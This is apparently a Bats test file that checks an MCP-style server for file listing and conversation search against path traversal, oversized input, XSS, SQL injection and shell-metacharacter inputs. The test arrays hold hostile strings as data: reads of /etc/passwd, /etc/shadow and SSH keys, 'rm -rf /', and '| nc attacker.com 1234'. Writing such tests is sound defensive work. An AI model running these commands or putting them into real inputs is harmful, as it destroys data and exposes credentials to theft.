#!/usr/bin/env bats
# Security and edge case handling
# Tests for validation, input sanitization, and edge case handling

set -eo pipefail

load 'fixtures/helpers/test-helpers.sh'

create_security_project() {
    cat <<'EOF' >README.md
# The Black Gate
EOF

    cat <<'EOF' >normal.py
print('find the one ring')
EOF

    cat <<'EOF' >.hidden_file
we were good once
EOF

    # Create nested structure for path traversal tests
    mkdir -p "safe/nested/path"
    cat <<'EOF' >"safe/nested/path/file.txt"
mithril armor
EOF

    git add . >/dev/null 2>&1
    git commit -m "the black gate" >/dev/null 2>&1
}

setup() {
    shared_setup
    create_security_project
}

teardown() {
    shared_teardown
}

@test "server blocks path traversal attempts in file operations" {
    local dangerous_patterns=(
        "../../../etc/passwd"
        "/etc/shadow"
        "~/.ssh/id_rsa"
        "..\\\\..\\\\..\\\\windows\\\\system32"
        "\$HOME/.bashrc"
    )

    for pattern in "${dangerous_patterns[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$pattern\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
            true
        elif echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
            true
        else
            local content
            content=$(echo "$output" | jq -r '.result.content[0].text')
            ! echo "$content" | grep -q "etc/passwd\|etc/shadow\|ssh\|windows\|system32\|bashrc"
        fi
    done
}

@test "file tools handle malicious file type filters safely" {
    # Test with null bytes and path traversal in file types
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"file_types": ["\u0000/etc/passwd"]}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should return error or sanitized results
    if echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
        echo "$output" | jq -e '.result.error' >/dev/null
    else
        echo "$output" | jq -e '.result.content[0].text' >/dev/null
        ! echo "$output" | grep -q "/etc/passwd"
    fi

    # Test with excessive array length
    local long_array='['
    for i in {1..50}; do
        long_array+='".txt",'
    done
    long_array=${long_array%,}']'

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": $long_array}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"
    echo "$output" | jq -e '.result' >/dev/null
}

@test "server validates file extensions according to security policy" {
    # Test dangerous file extensions that should be blocked
    local dangerous_extensions=(
        ".exe"
        ".bat"
        ".cmd"
        ".vbs"
        ".ps1"
        ".dll"
    )

    for ext in "${dangerous_extensions[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$ext\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
            local error_msg
            error_msg=$(echo "$output" | jq -r '.result.content[0].text')
            echo "$error_msg" | grep -q "not allowed\|Error\|invalid"
        else
            local content
            content=$(echo "$output" | jq -r '.result.content[0].text')
            ! echo "$content" | grep -q "found\|files.*$ext" || echo "$content" | grep -q "0 files\|No files"
        fi
    done

    # Test safe extensions that should be allowed
    local safe_extensions=(".py" ".js" ".md" ".json" ".yaml")

    for ext in "${safe_extensions[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$ext\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    done
}

@test "server sanitizes query inputs properly" {
    # Test query sanitization with dangerous patterns
    local dangerous_queries=(
        "<script>alert('xss')</script>"
        "'; DROP TABLE users; --"
        "javascript:alert(1)"
        "data:text/html,<script>alert(1)</script>"
        "file:///etc/passwd"
        "../../../etc/shadow"
    )

    for query in "${dangerous_queries[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$query\"}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        ! echo "$content" | grep -q "<script>\|DROP TABLE\|javascript:\|data:\|file://"
    done
}

@test "server validates conversation content security" {
    # Test parameter validation which is a key security feature
    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {"include_stats": "<script>alert(\"xss\")</script>"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should reject malicious parameter or handle gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error"
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$content" | jq -e '.project_name' >/dev/null
    fi
}

@test "server enforces security constants limits" {
    # Test MAX_STRING_LENGTH enforcement
    local huge_string
    huge_string=$(printf 'A%.0s' {1..51000}) # Exceed max length

    run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$huge_string\"}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle oversized input gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "exceed\|too long\|invalid" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi
}

@test "server blocks access to restricted system paths" {
    # Test blocked paths from SECURITY_BLOCKED_PATHS
    local blocked_paths=(
        "/etc"
        "/sys"
        "/proc"
        "/dev"
        "/root"
        "/boot"
        "/tmp"
        "/usr/bin"
    )

    for blocked_path in "${blocked_paths[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$blocked_path/*.txt\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        ! echo "$content" | grep -q "$blocked_path" || echo "$content" | grep -q "Error\|restricted\|denied"
    done
}

@test "server handles shell metacharacters safely" {
    # Test dangerous shell metacharacters in inputs
    local dangerous_chars=(
        "file.txt; rm -rf /"
        "file.txt && cat /etc/passwd"
        "file.txt | nc attacker.com 1234"
        "file.txt \$(whoami)"
        "file.txt \`id\`"
        "file.txt > /tmp/evil"
    )

    for dangerous_input in "${dangerous_chars[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$dangerous_input\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        ! echo "$content" | grep -q "root:\|uid=\|gid=\|/bin/bash"
    done
}

@test "project tools enforce parameter validation" {
    # Test invalid include_stats parameter
    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {"include_stats": "invalid"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should reject invalid parameter type
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error"
    elif echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.error')
        echo "$error_msg" | grep -q "boolean\|invalid"
    else
        local result_content
        result_content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$result_content" | jq -e '.project_name' >/dev/null
    fi
}

@test "cursor extraction tools handle invalid parameters safely" {
    # Test invalid summary parameter
    run execute_rpc "tools/call" '{"name": "query_cursor_conversations", "arguments": {"summary": "not_boolean"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle invalid parameter gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error" || true
    else
        local result_content
        result_content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$result_content" | jq -e '.workspaces' >/dev/null || echo "$result_content" | grep -q "workspaces\|conversations"
    fi
}

@test "server enforces input size limits" {
    # Test extremely long file type filter
    local huge_string
    huge_string=$(printf 'A%.0s' {1..1000}) # 1KB string

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$huge_string\"]}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    echo "$content" | grep -q "0 files\|No files\|empty" || [[ -n "$content" ]]
}

@test "server handles malformed JSON gracefully" {
    local malformed_json='{"invalid": json}'
    local python_cmd=$(get_python_executable)

    run bash -c "cd '$GANDALF_ROOT/server' && echo '$malformed_json' | PYTHONPATH=. '$python_cmd' src/main.py --project-root '$TEST_PROJECT_DIR' 2>/dev/null"
    [ "$status" -eq 0 ]

    # Server should return error response for malformed JSON
    echo "$output" | while IFS= read -r line; do
        if [[ -n "$line" ]] && echo "$line" | jq -e '.error.code == -32700' >/dev/null 2>&1; then
            exit 0
        fi
    done
}

@test "file operations handle special characters and unicode" {
    # Create files with special characters
    touch "file with spaces.txt"
    touch "file-with-dashes.txt"
    touch "file_with_underscores.txt"
    touch "file.with.dots.txt"
    touch "файл-unicode.txt" 2>/dev/null || true # Cyrillic

    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')

    # Should handle special characters without errors
    echo "$content" | grep -q "spaces\|dashes\|underscores\|dots" || true
}

@test "server handles concurrent requests safely" {
    # Test concurrent file listing requests
    local pids=()

    for i in {1..5}; do
        (
            execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {}}' >/dev/null
        ) &
        pids+=($!)
    done

    # Wait for all background processes to finish
    for pid in "${pids[@]}"; do
        wait "$pid"
    done

    # All processes should complete without errors
    [ ${#pids[@]} -eq 5 ]
}

@test "project operations handle corrupted git repositories" {
    # Create a corrupted git repository
    local corrupted_project="$TEST_HOME/corrupted-repo"
    mkdir -p "$corrupted_project"
    cd "$corrupted_project"

    # Create a fake git directory without proper structure
    mkdir -p .git
    echo "corrupted" >.git/HEAD
    echo "# Corrupted project" >README.md

    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$corrupted_project"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    
    # Should handle corrupted repo gracefully
    echo "$content" | jq -e '.project_name' >/dev/null || echo "$content" | grep -q "Error\|corrupted\|invalid"
}

@test "file operations enforce max_files parameter limits" {
    # Test with max_files parameter
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"max_files": 2}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    [[ -n "$content" ]]

    # Test with excessive max_files parameter
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"max_files": 99999}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    [[ -n "$content" ]]
}

@test "security validation handles conversation content properly" {
    # Test conversation content validation with various inputs
    local test_content=(
        "normal conversation content"
        "conversation with <script>alert('xss')</script>"
        "javascript:alert('malicious')"
        "data:text/html,<script>alert(1)</script>"
        "conversation with template injection"
    )

    for content in "${test_content[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$content\", \"include_content\": true}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local response_content
        response_content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$response_content" ]]

        # Check if it's a valid response (either conversations or error message)
        if ! echo "$response_content" | grep -q "conversations\|workspaces\|No conversations"; then
            echo "$response_content" | grep -q "Error\|error" || true
        fi
    done
}
